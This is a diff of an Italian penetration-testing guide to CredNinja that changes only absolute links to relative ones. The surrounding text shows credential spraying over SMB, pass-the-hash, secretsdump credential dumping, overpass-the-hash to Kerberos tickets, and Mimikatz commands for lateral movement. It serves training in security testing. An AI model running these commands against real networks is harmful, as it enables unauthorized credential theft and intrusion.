@@ -23,9 +23,9 @@ tags:
 
 # CredNinja: Pentest e Validazione Credenziali su Rete SMB
 
-CredNinja è un tool Python multithread che verifica in blocco quali credenziali (password o hash NTLM) sono valide su una lista di host Windows, testando l'autenticazione via [SMB](https://hackita.it/articoli/smb/) e segnalando dove ottieni admin locale. Nato come evoluzione di CredSwissArmy, opera di Chris King (@raikiasec).
+CredNinja è un tool Python multithread che verifica in blocco quali credenziali (password o hash NTLM) sono valide su una lista di host Windows, testando l'autenticazione via [SMB](/articoli/smb/) e segnalando dove ottieni admin locale. Nato come evoluzione di CredSwissArmy, opera di Chris King (@raikiasec).
 
-Per il confronto con lo strumento oggi più usato per lo stesso scopo: [NetExec su HackIta](https://hackita.it/articoli/netexec/)
+Per il confronto con lo strumento oggi più usato per lo stesso scopo: [NetExec su HackIta](/articoli/netexec/)
 
 ***
 
@@ -127,7 +127,7 @@ python3 CredNinja.py -a accounts.txt -s hosts.txt
 
 ### Pass-the-Hash
 
-L'hash LM `aad3b435b51404eeaad3b435b51404ee` è sempre uguale su sistemi moderni, quello dopo i `:` è l'NTLM — quello che conta. Approfondimento completo: [Pass-the-Hash su HackIta](https://hackita.it/articoli/pass-the-hash/)
+L'hash LM `aad3b435b51404eeaad3b435b51404ee` è sempre uguale su sistemi moderni, quello dopo i `:` è l'NTLM — quello che conta. Approfondimento completo: [Pass-the-Hash su HackIta](/articoli/pass-the-hash/)
 
 ```bash
 python3 CredNinja.py -a hashes.txt -s hosts.txt --ntlm
@@ -280,13 +280,13 @@ Comando NetExec equivalente:
 netexec smb hosts.txt -u accounts.txt -p passwords.txt --continue-on-success
 ```
 
-Vale comunque la pena conoscere CredNinja: codice sorgente semplice da leggere, ottimo per capire *come* funziona la validazione via SMB prima di affidarsi a tool più complessi. Guida completa: [NetExec su HackIta](https://hackita.it/articoli/netexec/)
+Vale comunque la pena conoscere CredNinja: codice sorgente semplice da leggere, ottimo per capire *come* funziona la validazione via SMB prima di affidarsi a tool più complessi. Guida completa: [NetExec su HackIta](/articoli/netexec/)
 
 ***
 
 ## Fase 5 — Sfruttare la credenziale trovata
 
-CredNinja ti dice *dove* hai admin locale. Da lì la fase offensiva vera parte con [Impacket](https://hackita.it/articoli/impacket/).
+CredNinja ti dice *dove* hai admin locale. Da lì la fase offensiva vera parte con [Impacket](/articoli/impacket/).
 
 ### Shell interattiva (crea un servizio, più rumoroso ma full-access)
 
@@ -320,7 +320,7 @@ secretsdump.py -hashes :5f4dcc3b5aa765d61d8327deb882cf99 CONTOSO/svc_backup@10.1
 
 ### Overpass-the-hash — dall'NT hash a un TGT Kerberos
 
-Utile quando NTLM è limitato o loggato più aggressivamente di [Kerberos](https://hackita.it/articoli/kerberos/):
+Utile quando NTLM è limitato o loggato più aggressivamente di [Kerberos](/articoli/kerberos/):
 
 ```bash
 getTGT.py -dc-ip 10.10.10.10 CONTOSO/svc_backup -hashes :5f4dcc3b5aa765d61d8327deb882cf99
@@ -330,7 +330,7 @@ wmiexec.py -k -no-pass CONTOSO/svc_backup@dc01.contoso.local
 
 ### Pass-the-hash da Windows con Mimikatz (se operi da un host Windows compromesso)
 
-Approfondimento completo: [Mimikatz su HackIta](https://hackita.it/articoli/mimikatz/)
+Approfondimento completo: [Mimikatz su HackIta](/articoli/mimikatz/)
 
 ```
 sekurlsa::pth /user:svc_backup /domain:contoso.local /ntlm:5f4dcc3b5aa765d61d8327deb882cf99
@@ -422,6 +422,6 @@ Sì, come qualunque tool di validazione massiva. Senza `--stripe` o delay, un do
 
 ***
 
-*Guida a CredNinja — repository originale: [github.com/Raikia/CredNinja](https://github.com/Raikia/CredNinja). Per approfondire Active Directory: [Guida AD su HackIta](https://hackita.it/articoli/active-directory/)*
+*Guida a CredNinja — repository originale: [github.com/Raikia/CredNinja](https://github.com/Raikia/CredNinja). Per approfondire Active Directory: [Guida AD su HackIta](/articoli/active-directory/)*
 
 \#credninja #smb #pth
